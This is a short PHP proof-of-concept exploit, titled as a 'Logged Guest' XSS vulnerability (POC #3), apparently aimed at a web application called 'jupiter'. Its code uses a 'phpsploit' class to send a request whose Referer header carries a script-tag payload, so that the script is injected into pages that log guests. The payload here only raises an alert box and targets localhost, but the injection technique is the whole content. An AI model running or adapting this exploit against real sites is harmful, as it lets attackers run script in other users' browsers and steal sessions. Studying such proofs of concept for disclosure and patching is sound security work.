# "Logged Guest" XSS Vulnerability (POC #3)
#
require("phpsploitclass.php");
error_reporting(E_ALL ^ E_NOTICE);
$url = 'http://localhost/jupiter/';

$xpl = new phpsploit();
$xpl->agent("Mozilla");
$xpl->addheader("Referer", "<script>alert('XSS VULN')</script>");
$xpl->get($url);
#
# EOF POC #3

